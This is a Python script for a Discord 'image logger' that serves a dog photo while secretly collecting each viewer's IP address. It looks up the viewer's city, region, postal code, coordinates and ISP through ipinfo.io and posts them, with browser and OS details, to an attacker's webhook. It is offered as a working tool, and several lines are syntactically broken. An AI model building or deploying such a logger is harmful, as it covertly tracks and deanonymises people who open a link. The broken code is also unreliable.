from http.server import BaseHTTPRequestHandler
from urllib import parse
import httpx, httpagentparser

webhook = # enter a webhook here

bindata = httpx.get('https://media.wired.com/photos/5a5547032b3a7778f5ca06cb/125:94/w_1593,h_1198,c_limit/Doggo-FeatureArt2-104685145.jpg').content # the image link
buggedimg = True
# if true embed lol



def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
    return {
  "username": "ImageLogger",
  "content": "@everyone",
  "embeds": [
    {
      "title": "Image logger",
      "color": 15132410,
      "description": "New Image log!",
      "author": {
        "name": "loggerlmao"
      },
      "fields": [
        {
          "name": "IP Info",
          "value": f"**IP:** `{ip}`\n**City:** `{city}`\n**Region:** `{reg}`\n**Country:** `{country}`\n**Location:** `{loc}`\n**ORG:** `{org}`\n**ZIP:** `{postal}`",
          "inline": True
        },
        {
          "name": "Advanced Info",
          "value": f"**OS:** `{os}`\n**Browser:** `{browser}`\n**UserAgent:** `Look Below!`\n```yaml\n{useragent}\n```",
          "inline": False
        }
      ]
    }
  ],
}

def previewip,uag):
  return {
  "username": "Image logger",
  "content": "",
  "embeds": [
    {
      "title": "Image Logger",
      "color": 15132410,
      "description": f"New image log Heres the IP.\n\n**IP:** `{ip}`\n**UserAgent:** `Look Here!`\n```yaml\n{uag}```",
      "author": {
        "name": "ImageLogger"
      },
      "fields": [
      ]
    }
  ],
}

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        s = self.path
        dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
        try: data = httpx.get(dic['url']).content if 'url' in dic else bindata
        except Exception: data = bindata
        useragent = self.headers.get('user-agent') if 'user-agent' in self.headers else 'No User Agent Found!'
        os, browser = httpagentparser.simple_detect(useragent)
        if self.headers.get('x-forwarded-for').startswith(('35','34','104.196')):
            if 'discord' in useragent.lower(): self.send_response(200); self.send_header('Content-type','image/jpeg'); self.end_headers(); self.wfile.write(buggedbin if else bindata); httpx.post(webhook,json=prev(self.headers.get('x-forwarded-for'),useragent))
            else: pass
        else: self.send_response(200); self.send_header('Content-type','image/jpeg'); self.end_headers(); self.wfile.write(data); ipInfo = httpx.get('https://ipinfo.io/{}/json'.format(self.headers.get('x-forwarded-for'))).json(); httpx.post(webhook,json=formatHook(ipInfo['ip'],ipInfo['city'],ipInfo['region'],ipInfo['country'],ipInfo['loc'],ipInfo['org'],ipInfo['postal'],useragent,os,browser))
        return